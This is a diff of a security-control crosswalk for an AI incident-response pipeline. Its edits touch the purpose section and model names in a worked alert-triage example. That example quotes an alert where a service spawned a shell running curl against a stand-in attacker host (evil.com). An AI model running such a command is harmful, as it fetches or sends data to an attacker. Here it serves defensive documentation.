@@ -38,7 +38,7 @@ related:
 
 ## Purpose
 
-This crosswalk maps each Squire-specific control to the seven frameworks interviewers and compliance reviewers cite: NIST SP 800-53 Rev 5, NIST CSF 2.0, MITRE ATT&CK Enterprise, CSA Agentic Profile MANAGE function, OWASP LLM Top 10 (2025), NIST SP 800-61 Rev 3, and NIST AI RMF 1.0. The mapping targets readiness for Dropzone AI, OneDigital, Resilience, and similar conversations that blend traditional security control language with AI-specific governance.
+This crosswalk maps each Squire-specific control to the seven frameworks interviewers and compliance reviewers cite: NIST SP 800-53 Rev 5, NIST CSF 2.0, MITRE ATT&CK Enterprise, CSA Agentic Profile MANAGE function, OWASP LLM Top 10 (2025), NIST SP 800-61 Rev 3, and NIST AI RMF 1.0. The mapping targets conversations that blend traditional security control language with AI-specific governance.
 
 ## How to Read This Document
 
@@ -227,7 +227,7 @@ A Falco syscall alert arrives: `svc-n8n` spawned `/bin/sh -c curl http://evil.co
 1. **Row 1** (ingest token auth) passes.
 2. **Row 3** (pre-graph PII scanner) runs. No PII matches. Continues.
 3. **Row 13** (alert dedup) checks Redis; no prior in window. Continues.
-4. **Classify node** (Row 10 model routing enforces Sonnet 4.6) returns `severity=HIGH`, `category=execution`.
+4. **Classify node** (Row 10 model routing enforces Opus 5) returns `severity=HIGH`, `category=execution`.
 5. **Retrieve node** (Row 6 pgvector isolation) pulls six chunks from `ir_chunks` covering `PLAYBOOK_COMPROMISED_CONTAINER.md`, `POLICY_INCIDENT_RESPONSE.md`, and two Falco rule references.
 6. **Enrich node** queries Tavily for `curl evil.com shell injection`.
 7. **Investigate node** (Row 10 Fable 5) synthesizes narrative. Row 9 iteration cap is 3; investigate uses 1 pass.
